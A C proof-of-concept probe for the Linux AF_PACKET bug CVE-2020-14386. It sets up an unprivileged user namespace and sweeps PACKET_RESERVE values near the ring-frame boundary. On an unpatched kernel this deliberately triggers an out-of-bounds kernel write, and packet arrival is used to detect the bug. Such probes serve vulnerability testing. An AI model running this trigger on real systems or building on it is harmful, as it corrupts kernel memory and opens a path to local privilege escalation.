/*
 * CVE-2020-14386 precise vulnerability probe
 * 
 * From previous test: netoff = 80 + reserve, macoff = 66 + reserve
 * Ring check: frame_size >= tp_hdrlen(64) + reserve
 * 
 * For OOB: macoff > frame_size → reserve > frame_size - 66
 * While passing ring check: reserve ≤ frame_size - 64
 * Window: frame_size - 66 < reserve ≤ frame_size - 64
 *         reserve ∈ {frame_size - 65, frame_size - 64}
 *
 * With frame_size=65536: reserve ∈ {65471, 65472}
 *   macoff = 65537 or 65538 → 1-2 bytes past frame!
 *   res = frame_size - macoff underflows → huge → snaplen uncapped
 *   Full packet (~300 bytes) written past frame boundary!
 *
 * If packet arrives → VULNERABLE (no macoff + snaplen check)
 * If packet dropped → PATCHED
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <stdint.h>
#include <poll.h>

static int setup_userns(void) {
    uid_t uid = getuid(); gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("unshare"); return -1;
    }
    char buf[64]; int fd;
    fd = open("/proc/self/setgroups", O_WRONLY);
    if (fd >= 0) { write(fd, "deny", 4); close(fd); }
    snprintf(buf, sizeof(buf), "0 %d 1", uid);
    fd = open("/proc/self/uid_map", O_WRONLY);
    if (fd < 0) return -1;
    write(fd, buf, strlen(buf)); close(fd);
    snprintf(buf, sizeof(buf), "0 %d 1", gid);
    fd = open("/proc/self/gid_map", O_WRONLY);
    if (fd < 0) return -1;
    write(fd, buf, strlen(buf)); close(fd);
    return 0;
}

static void setup_lo(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct ifreq ifr = {0};
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
    ifr.ifr_flags = IFF_UP | IFF_LOOPBACK | IFF_RUNNING;
    ioctl(s, SIOCSIFFLAGS, &ifr);
    close(s);
}

/* Test a specific reserve value for OOB write */
static int test_reserve(unsigned int reserve, unsigned int frame_size,
                        int verbose) {
    int sock, ret;
    int version = TPACKET_V2;

    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) return -1;

    setsockopt(sock, SOL_PACKET, PACKET_VERSION, &version, sizeof(version));

    ret = setsockopt(sock, SOL_PACKET, PACKET_RESERVE, &reserve, sizeof(reserve));
    if (ret < 0) {
        if (verbose) printf("  reserve=%-6u RESERVE setsockopt FAILED\n", reserve);
        close(sock); return -1;
    }

    struct tpacket_req req = {
        .tp_block_size = frame_size,
        .tp_block_nr = 4,
        .tp_frame_size = frame_size,
        .tp_frame_nr = 4,
    };

    ret = setsockopt(sock, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (ret < 0) {
        if (verbose) printf("  reserve=%-6u ring setup FAILED (errno=%d)\n", reserve, errno);
        close(sock); return -2;
    }

    size_t ring_size = (size_t)frame_size * 4;
    void *ring = mmap(NULL, ring_size, PROT_READ | PROT_WRITE, MAP_SHARED, sock, 0);
    if (ring == MAP_FAILED) {
        close(sock); return -3;
    }

    struct sockaddr_ll sll = {0};
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = 1;
    bind(sock, (struct sockaddr *)&sll, sizeof(sll));

    /* Send a small UDP packet */
    int ss = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    dst.sin_port = htons(44444);
    sendto(ss, "PROBE", 5, 0, (struct sockaddr *)&dst, sizeof(dst));
    close(ss);

    /* Wait for packet */
    struct pollfd pfd = { .fd = sock, .events = POLLIN };
    poll(&pfd, 1, 300); /* 300ms timeout */

    /* Check ring */
    int found = 0;
    for (int i = 0; i < 4; i++) {
        struct tpacket2_hdr *hdr = (struct tpacket2_hdr *)((uint8_t *)ring + (size_t)i * frame_size);
        if (hdr->tp_status != 0) {
            found++;
            unsigned int expected_macoff = 66 + reserve;
            if (verbose) {
                printf("  reserve=%-6u → pkt: len=%u snap=%u mac=%u net=%u | "
                       "expected_macoff=%u frame=%u %s\n",
                       reserve, hdr->tp_len, hdr->tp_snaplen,
                       hdr->tp_mac, hdr->tp_net,
                       expected_macoff, frame_size,
                       expected_macoff > frame_size ? "**OOB**" : "inbounds");
            }
            break;
        }
    }

    if (!found && verbose) {
        unsigned int expected_macoff = 66 + reserve;
        printf("  reserve=%-6u → DROPPED (macoff=%u would exceed frame=%u by %d)\n",
               reserve, expected_macoff, frame_size,
               (int)expected_macoff - (int)frame_size);
    }

    munmap(ring, ring_size);
    close(sock);
    return found;
}

int main(void) {
    printf("CVE-2020-14386 Precise Probe\n");
    printf("============================\n\n");

    if (setup_userns() < 0) {
        fprintf(stderr, "Failed to set up user namespace\n");
        return 1;
    }
    setup_lo();
    printf("[+] In user namespace, uid=%d\n\n", getuid());

    unsigned int frame_size = 65536;

    /*
     * Scan reserve values around the overflow boundary.
     * tp_hdrlen=64 on this kernel (includes sockaddr_ll).
     * Ring check: frame_size >= 64 + reserve → reserve <= 65472
     * macoff = 66 + reserve
     * macoff > frame_size when reserve > 65470
     *
     * Test range: 65460 to 65480
     */
    printf("[*] Frame size: %u\n", frame_size);
    printf("[*] Testing reserves near overflow boundary...\n");
    printf("[*] Expected tp_hdrlen=64, macoff = 66 + reserve\n");
    printf("[*] OOB when macoff > frame_size, i.e., reserve > %u\n\n", frame_size - 66);

    for (unsigned int r = frame_size - 76; r <= frame_size - 54; r++) {
        test_reserve(r, frame_size, 1);
    }

    printf("\n");

    /* Also test with larger frame sizes for comparison */
    printf("[*] Testing with frame_size=131072 (128KB):\n");
    unsigned int large_fs = 131072;
    /* macoff > 131072 when reserve > 131006 */
    /* ring check: reserve ≤ 131072 - 64 = 131008 */
    for (unsigned int r = large_fs - 76; r <= large_fs - 54; r++) {
        test_reserve(r, large_fs, 1);
    }

    return 0;
}
